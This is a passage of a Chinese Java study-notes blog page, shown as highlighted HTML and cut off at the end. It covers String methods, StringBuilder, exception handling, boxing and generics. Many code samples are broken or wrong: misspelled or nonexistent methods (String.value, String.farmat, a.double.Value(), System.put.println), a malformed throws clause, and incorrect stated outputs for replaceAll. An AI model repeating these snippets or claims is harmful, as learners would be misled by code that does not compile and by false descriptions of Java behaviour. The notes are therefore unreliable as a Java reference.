java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> String.value（<span class="number">1234</span>）<span class="comment">//整型转字符串</span></span><br><span class="line"><span class="type">int</span> <span class="variable">data</span> <span class="operator">=</span> Integer.parseInt(<span class="string">&quot;1234&quot;</span>);<span class="comment">//输出int型</span></span><br><span class="line"><span class="type">double</span> <span class="variable">data1</span> <span class="operator">=</span> parseDouble(<span class="string">&quot;12.34&quot;</span>);<span class="comment">//输出double型</span></span><br></pre></td></tr></table></figure><h5 id="大小写转化"><a href="#大小写转化" class="headerlink" title="大小写转化"></a>大小写转化</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> str1.toUpperCase(str1);</span><br><span class="line"><span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="string">&quot;HELLO&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> str1.toLowerCase(str2);</span><br></pre></td></tr></table></figure><p><strong>java中String是不可变的</strong><br>在java中 hello-&gt;转化不是在原来的字符串基础上转换 而是产生了一个新的对象 </p><h5 id="字符串转数组"><a href="#字符串转数组" class="headerlink" title="字符串转数组"></a>字符串转数组</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="type">char</span>[] arry = str1.toCharArray（）;</span><br></pre></td></tr></table></figure><h5 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> String.farmat(<span class="string">&quot;%d-%d-%d&quot;</span>,<span class="number">2023</span>,<span class="number">9</span>,<span class="number">28</span>);</span><br></pre></td></tr></table></figure><h4 id="字符串的替换"><a href="#字符串的替换" class="headerlink" title="字符串的替换"></a>字符串的替换</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;ababcabcdabcde&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> str.replace(<span class="string">&quot;ab&quot;</span>,<span class="string">&quot;yub&quot;</span>);</span><br><span class="line"><span class="comment">//把所有的&quot;ab&quot;进行替换</span></span><br><span class="line"><span class="comment">//不是在原来字符串上进行替换 产生了一个新的对象</span></span><br><span class="line"><span class="type">String</span> <span class="variable">ret2</span> <span class="operator">=</span> str.replace(<span class="string">&quot;c&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">ret3</span> <span class="operator">=</span> str.replaceFirst(<span class="string">&quot;ab&quot;</span>,<span class="string">&quot;yub&quot;</span>);</span><br><span class="line"><span class="comment">//只替换第一个&quot;ab&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">ret4</span> <span class="operator">=</span> str.replaceAll(<span class="string">&quot;ab&quot;</span>,<span class="string">&quot;yub&quot;</span>);</span><br><span class="line"><span class="comment">//替换所有的&quot;ab&quot;</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong><br>replace和replaceALL的区别<br>replaceALL支持正则表达式<br>replace不支持正则表达式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">src</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;ab43a2c43d&quot;</span>); </span><br><span class="line"></span><br><span class="line">System.out.println(src.replace(<span class="string">&quot;3&quot;</span>,<span class="string">&quot;f&quot;</span>));</span><br><span class="line">=&gt;ab4f2c4fd. </span><br><span class="line">    </span><br><span class="line">System.out.println(src.replace(<span class="string">&#x27;3&#x27;</span>,<span class="string">&#x27;f&#x27;</span>));</span><br><span class="line">=&gt;ab4f2c4fd. </span><br><span class="line">       System.out.println(src.replaceAll(<span class="string">&quot;\\d&quot;</span>,<span class="string">&quot;f&quot;</span>));</span><br><span class="line">=&gt;abffafcffd. </span><br><span class="line">       System.out.println(src.replaceAll(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;f&quot;</span>));</span><br><span class="line">=&gt;fb43fc23d. </span><br><span class="line">       System.out.println(src.replaceFirst(<span class="string">&quot;\\d,&quot;</span>f<span class="string">&quot;));</span></span><br><span class="line"><span class="string">=&gt;abf32c43d     </span></span><br><span class="line"><span class="string">       System.out.println(src.replaceFirst(&quot;</span><span class="number">4</span><span class="string">&quot;,&quot;</span>h<span class="string">&quot;));</span></span><br><span class="line"><span class="string">=&gt;abh32c43d.</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>“\”在java中是一个转义字符，所以需要用两个代表一个。例如System.out.println( “\“ ) ;只打印出一个”&quot;。但是“\”也是正则表达式中的转义字符，需要用两个代表一个。</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;<span class="subst">\\</span><span class="subst">\\</span>&quot;</span>被java转换成<span class="string">&quot;<span class="subst">\\</span>&quot;</span>，<span class="string">&quot;<span class="subst">\\</span>&quot;</span>又被正则表达式转换成<span class="string">&quot;<span class="subst">\&quot;</span></span></span><br></pre></td></tr></table></figure><h4 id="字符串拆分"><a href="#字符串拆分" class="headerlink" title="字符串拆分"></a>字符串拆分</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;name=yub&amp;age=0.4&quot;</span>;</span><br><span class="line">String[] string = str.split(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line"><span class="comment">//分割之后的结果要存储在数组中</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;yu bo love&quot;</span>;</span><br><span class="line">String[] string = str.split(<span class="string">&quot; &quot;</span>,<span class="number">3</span>);</span><br><span class="line"><span class="comment">//分成三组输出</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; string.length; i++)&#123;</span><br><span class="line">System.out.println(string[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><p>1.字符”|”,”*”,”+”都得加上转义字符，前面加上 “\&quot; .<br>2.是 “&quot; ，那么就得写成 “\\“ .<br>3.如果一个字符串中有多个分隔符 可以用”|”作为连字符</p><h4 id="字符串的截取"><a href="#字符串的截取" class="headerlink" title="字符串的截取"></a>字符串的截取</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;yublove&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> s.substring(<span class="number">1</span>);</span><br><span class="line"><span class="comment">//输出&quot;ublove&quot;</span></span><br><span class="line"><span class="comment">//如果为String ret = s.substring(0); 模特让你返回原来的对象 但如果传入其他对象 则返回新对象</span></span><br><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;yublove&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> s.substring(<span class="number">1</span>,<span class="number">4</span>);</span><br><span class="line"><span class="comment">//java中都是左闭右开 ret值为ubl</span></span><br></pre></td></tr></table></figure><h4 id="其他操作方法"><a href="#其他操作方法" class="headerlink" title="其他操作方法"></a>其他操作方法</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot; y u b love &quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">ret1</span> <span class="operator">=</span> str.trim();</span><br><span class="line"><span class="comment">//ret1的值为&quot;y u b love&quot; 去掉左右空格 剩余中间空格</span></span><br></pre></td></tr></table></figure><hr><p><strong>字符串为什么是不可变的</strong>？<br>final修饰基本数据类型 基本数据类型的值不能被改变<br>final修饰引用类型 引用类型的指向不可改变 但内容可改<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240211211120608.png" alt="image-20240211211120608"></p><p>但value指向的内容可以发生改变</p><p>为什么 String 要设计成不可变的?(不可变对象的好处是什么?) 1. 方便实现字符串对象池. 如果 String 可变, 那么对象池就需要考虑写时拷贝的问题了.<br>2.不可变对象是线程安全的.<br>3.不可变对象更方便缓存 hash code, 作为 key 时可以更高效的保存到 HashMap 中.</p><p>不是所有的传引用 都是改变原来的值  具体情况依据代码而定 有可能只改变了指向</p><h3 id="StringBuilder"><a href="#StringBuilder" class="headerlink" title="StringBuilder"></a>StringBuilder</h3><p>StringBuffuer不能直接赋值  </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">StringBuilder</span> <span class="variable">stringbuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;yub&quot;</span>);</span><br><span class="line"><span class="comment">//重写tostring方法 输出yub</span></span><br><span class="line">stringBulider.append(<span class="string">&quot;bo&quot;</span>);</span><br><span class="line">stringBulider.append(<span class="string">&quot;yu&quot;</span>).append(<span class="number">13.14</span>);</span><br><span class="line"><span class="comment">//进行拼接 效率高于&quot;+&quot;</span></span><br></pre></td></tr></table></figure><p>StringBuilder和StingBuffer是可变的 效率更高</p><p>StringBuilder不考虑并发<br>StringBuffer适用于多线程<br><strong>注意</strong><br>String和StringBuilder类不能直接转换。<br>互相转换，可以采用如下原则:<br> String变为StringBuilder: 利用StringBuilder的构造方法或append()方法<br>StringBuilder变为String: 调用toString()方法</p><h5 id="String、StringBuffer、StringBuilder的区别"><a href="#String、StringBuffer、StringBuilder的区别" class="headerlink" title="String、StringBuffer、StringBuilder的区别"></a>String、StringBuffer、StringBuilder的区别</h5><p>1.String的内容不可修改，StringBuffer与StringBuilder的内容可以修改.<br>2.StringBuffer与StringBuilder大部分功能是相似的 StringBuffer采用同步处理，属于线程安全操作；<br>3.StringBuilder未采用同步处理，属于线程不安全操</p><h4 id="异常-1"><a href="#异常-1" class="headerlink" title="异常"></a>异常</h4><h5 id="编译时异常-受查异常"><a href="#编译时异常-受查异常" class="headerlink" title="编译时异常&#x2F;受查异常"></a>编译时异常&#x2F;受查异常</h5><p>CloneNotSupported</p><h5 id="运行时异常-非受查异常"><a href="#运行时异常-非受查异常" class="headerlink" title="运行时异常&#x2F;非受查异常"></a>运行时异常&#x2F;非受查异常</h5><p>数组越界<br>空指针<br>算数异常</p><h5 id="异常的处理"><a href="#异常的处理" class="headerlink" title="异常的处理"></a>异常的处理</h5><p><strong>事前防御</strong><br><strong>事后认错</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">执行可能出现异常的代码</span><br><span class="line">&#125;<span class="keyword">catch</span>&#123;</span><br><span class="line">匹配</span><br><span class="line">&#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">执行资源的饿关闭</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>优势：正常流程和错误流程分开处理</p><h6 id="异常处理的五个关键字"><a href="#异常处理的五个关键字" class="headerlink" title="异常处理的五个关键字"></a>异常处理的五个关键字</h6><h6 id="throw"><a href="#throw" class="headerlink" title="throw"></a>throw</h6><p>抛出异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(a == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="comment">//抛出一个自定异常</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ArithmeticException</span>(<span class="string">&quot;a == 10&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong><br>   1.throw必须写在方法体内部 </p><ol start="2"><li>抛出的对象必须是Exception 或者 Exception 的子类对</li><li>如果抛出的是 RunTimeException 或者RunTimeException 的子类，则可.以不用处理，直接交给JVM来处理 </li><li>如果抛出的是编译时异常，用户必须处理，否则无法通过编译 </li><li>异常一旦抛出，其后的代码就不会执</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//throws CloneNotSupportException一般放在方法声明的地方</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> CloneNotSupportExceptionthrows&#123;</span><br><span class="line">    test();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//JVM进行处理</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">test</span><span class="params">()</span> <span class="keyword">throws</span> CloneNotSupportExceptionthrows &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span>(a == <span class="number">0</span>)&#123;</span><br><span class="line"><span class="comment">//抛出一个自定异常</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ArithmeticException</span>(<span class="string">&quot;a == 10&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><ol><li>throws必须跟在方法的参数列表之后 </li><li>声明的异常必须是 Exception 或者 Exception 的子类 </li><li>方法内部如果抛出了多个异常，throws之后必须跟多个异常类型，之间用逗号隔开，如果抛出多个异常类型 具有父子关系，直接声明父类即可。</li></ol><p><strong>关于异常的处理方式</strong><br>异常的种类有很多, 我们要根据不同的业务场景来决定.<br>对于比较严重的问题(例如和算钱相关的场景), 应该让程序直接崩溃, 防止造成更严重的后果 对于不太严重的问题(大多数场景), 可以记录错误日志, 并通过监控报警程序及时通知程序猿 对于可能会恢复的问题(和网络相关的场景), 可以尝试进行重试. </p><h5 id="try-catch"><a href="#try-catch" class="headerlink" title="try-catch"></a>try-catch</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.println(<span class="number">10</span>/<span class="number">0</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;其他业务代码&quot;</span>);</span><br></pre></td></tr></table></figure><p>这个异常没有被处理 会交给jvm处理 一旦由jvm处理 程序就绪异常终止</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  System.out.println(<span class="number">10</span>/<span class="number">0</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span>(NullPointerException e) &#123;</span><br><span class="line">    System.put.println(<span class="string">&quot;捕获到了算术异常！&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>catch一定要捕获一个对应的异常 否则最后还是交给jvm</p><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">try</span> &#123;</span><br><span class="line">  <span class="title class_">System</span>.<span class="property">out</span>.<span class="property">println</span>(<span class="number">10</span>/<span class="number">0</span>);</span><br><span class="line">&#125;<span class="title function_">catch</span>(<span class="params">Exception</span> <span class="params">e</span>) &#123;</span><br><span class="line">    <span class="title class_">System</span>.<span class="property">put</span>.<span class="property">println</span>(<span class="string">&quot;捕获到了算术异常！&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Exception是所有类的父类 不能区分exception捕捉的是什么异常 不建议使用exception进行判断</p><p>可以通过’|’并写很多个异常检查<br>或者分开写 将Exception父类写到最后</p><p><strong>注意</strong><br>1.try块内抛出异常位置之后的代码将不会被执行 </p><p>2.如果抛出异常类型与catch时异常类型不匹配，即异常不会被成功捕获，也就不会被处理，继续往外抛，直到 JVM收到后中断程序—-异常是按照类型来捕获的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="type">int</span>[] array = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;;</span><br><span class="line">System.out.println(array[<span class="number">3</span>]); <span class="comment">// 此处会抛出数组越界异常</span></span><br><span class="line">&#125;<span class="keyword">catch</span> (NullPointerException e)&#123; <span class="comment">// 捕获时候捕获的是空指针异常--真正的异常无法被捕获到</span></span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">System.out.println(<span class="string">&quot;后序代码&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">Exception in thread <span class="string">&quot;main&quot;</span> java.lang.ArrayIndexOutOfBoundsException: 3at day20210917.ArrayOperator.main(ArrayOperator.java:<span class="number">24</span>)</span><br></pre></td></tr></table></figure><p>3.try中可能会抛出多个不同的异常对象，则必须用多个catch来捕获—-即多种异常，多次捕获</p><ol start="4"><li>可以通过一个catch捕获所有的异常，即多个异常，一次捕获(不推荐)</li></ol><h5 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h5><p>在写程序时，有些特定的代码，不论程序是否发生异常，都需要执行，比如程序中打开的资源：网络连接、数据库 连接、IO流等，在程序正常或者异常退出时，必须要对资源进进行回收。另外，因为异常会引发程序的跳转，可能 导致有些语句执行不到，finally就是用来解决这个问题的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="comment">// 可能会发生异常的代码</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(异常类型 e)&#123;</span><br><span class="line"><span class="comment">// 对捕获到的异常进行处理</span></span><br><span class="line">&#125;<span class="keyword">finally</span>&#123;</span><br><span class="line"><span class="comment">// 此处的语句无论是否发生异常，都会被执行到</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果没有抛出异常，或者异常被捕获处理了，这里的代码也会执行</span></span><br></pre></td></tr></table></figure><p><strong>注意</strong><br>finally中的代码一定会执行的，一般在finally中进行一些资源清理的扫尾工作。<br>finally中的语句一定会执行</p><p><strong>throw和throw的区别</strong></p><p>throw是抛出一个异常<br>throws是对一个异常的声明</p><h4 id="异常的处理流程"><a href="#异常的处理流程" class="headerlink" title="异常的处理流程"></a>异常的处理流程</h4><p>程序先执行try 中的代码<br>如果try中的代码出现异常,就会结束try 中的代码,看和catch中的异常类型是否匹配.如果找到匹配的异常类型,就会执行catch中的代码<br>如果没有找到匹配的异常类型,就会将异常向上传递到上层调用者.<br>无论是否找到匹配的异常类型, finally中的代码都会被执行到(在该方法结束之前执行).如果上层调用者也没有处理的了异常,就继续向上传递.<br>一直到main方法也没有合适的代码处理异常,就会交给ⅣM-来进行处理,此时程序就会异常终止.</p><h4 id="自定义异常"><a href="#自定义异常" class="headerlink" title="自定义异常"></a>自定义异常</h4><p> 1.自定义异常类，然后继承自Exception 或RunTimeException </p><ol start="2"><li>实现一个带有String类型参数的构造方法，参数含义：出现异常的原因</li></ol><p><strong>注意</strong><br>自定义异常通常会继承自 Exception 或者 RuntimeException 继承自 Exception 的异常默认是受查异常 继承自 RuntimeException 的异常默认是非受查异常</p><p><strong>受查异常</strong><br>IOException（同输入输出相关的操作，如无效输入，打开一个不存在在文件）<br>ClassNotFoundException（使用不存在的类）</p><p>特征：编译就不能通过。方法要抛出的受查异常必须在方法头中显示声明，然后编译器会核查是否为所有的受查异常提供了构造器（try-catch）。</p><p><strong>非受查异常</strong><br>ArithmeticException（算数异常）<br>NullPointerException（指向对象为空异常）<br>IndexOutOfBoundsException（数组超标异常）<br>IllegalArgumentException（传递非法参数异常）</p><p>特征：可以通过编译，从名字知道，他的错误发生在运行时，上面的 1&#x2F;0 就是一个算数异常，它可以通过编译，但无法运行。不要求显示声明非受查异常（try-catch是无法解决RE异常的，但是仍旧可以捕捉RE异常）。</p><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/image-20240213105150875.png" alt="image-20240213105150875"></p><h3 id="时间复杂度和空间复杂度"><a href="#时间复杂度和空间复杂度" class="headerlink" title="时间复杂度和空间复杂度"></a>时间复杂度和空间复杂度</h3><p>1、用常数1取代运行时间中的所有加法常数。<br>2、在修改后的运行次数函数中，只保留最高阶项。<br>3、如果最高阶项存在且不是1，则去除与这个项目相乘的常数。得到的结果就是大O阶。</p><p>两个算法乳沟比较复杂度时 比较最坏情况</p><p><strong>递归的复杂度 &#x3D; 递归的次数 * 每次递归的次数</strong></p><h3 id="包装类"><a href="#包装类" class="headerlink" title="包装类"></a>包装类</h3><p>java中基本类型不是继承自object 非了在泛型代码中支持基本类型 java给每个基本类型一个包装类型</p><h4 id="装箱"><a href="#装箱" class="headerlink" title="装箱"></a>装箱</h4><p>把一个基本数据类型转化为包装类型的数据<br><strong>分类</strong><br>自动装箱（隐式）<br>显示装箱</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">b</span> <span class="operator">=</span> a;</span><br><span class="line"><span class="comment">//输出b为10 隐式装箱</span></span><br><span class="line"></span><br><span class="line"><span class="type">Integer</span> <span class="variable">c</span> <span class="operator">=</span> Integer.valueOf(a);</span><br><span class="line"><span class="comment">//显示装箱</span></span><br></pre></td></tr></table></figure><h3 id="拆箱"><a href="#拆箱" class="headerlink" title="拆箱"></a>拆箱</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">a</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">10</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> a;</span><br><span class="line"><span class="comment">//自动拆箱</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//显示拆箱 拆箱为自己指定的元素</span></span><br><span class="line"><span class="type">int</span> <span class="variable">c</span> <span class="operator">=</span> a.intValue();</span><br><span class="line"><span class="type">double</span> <span class="variable">d</span> <span class="operator">=</span> a.<span class="type">double</span>.Value();</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">100</span>;</span><br><span class="line">System.out.println(a == b);</span><br><span class="line"><span class="comment">//true</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">a2</span> <span class="operator">=</span> <span class="number">200</span>;</span><br><span class="line"><span class="type">Integer</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="number">200</span>;</span><br><span class="line">System.out.println(a2 == b2);</span><br><span class="line"><span class="comment">//false</span></span><br></pre></td></tr></table></figure><p>valueOf底层源码范围为-128~127（256）超出范围相当于new了一个新对象 return false</p><h3 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h3><p>一般的类和方法 只能使用具体的类型（基本类型&#x2F;自定义的类）</p><p>JDK1.5引入 泛型 适用于多种类型 从代码上讲就是对类型实现了参数化</p><h4 id="引出泛型"><a href="#引出泛型" class="headerlink" title="引出泛型"></a>引出泛型</h4><p><strong><T>代表当前类是泛型类</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span>&#123;</span><br><span class="line">  <span class="keyword">public</span> Object[] array = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">10</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">set</span><span class="params">(<span class="type">int</span> pos,Object val)</span>&#123;</span><br><span class="line">      array[pos] = val;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(<span class="type">int</span> pos)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> array[pos];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Test&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">            <span class="type">Myarray</span> <span class="variable">myarry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Myarray</span>();</span><br><span class="line">            myArray.set(<span class="number">0</span>,<span class="string">&quot;hello&quot;</span>);</span><br><span class="line">            myArray.set(<span class="number">1</span>,<span class="number">90</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> myArray.get(<span class="number">0</span>);</span><br><span class="line">       <span class="comment">//报错 get方法的返回值 是Object 父类给子类需要强转</span></span><br><span class="line">            <span class="type">String</span> <span 